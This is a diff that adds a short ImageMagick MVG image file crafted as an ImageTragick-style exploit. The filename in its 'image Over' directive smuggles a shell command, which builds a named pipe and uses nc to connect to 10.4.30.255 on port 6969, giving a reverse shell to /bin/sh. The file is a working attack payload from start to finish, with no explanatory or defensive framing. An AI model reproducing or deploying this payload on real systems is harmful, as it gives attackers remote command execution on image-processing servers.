@@ -1,0 +1,8 @@
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|mkfifo /tmp/rcotkq; nc 10.4.30.255 6969 0</tmp/rcotkq | /bin/sh >/tmp/rcotkq 2>&1; rm /tmp/rcotkq'
+pop graphic-context
+pop graphic-context
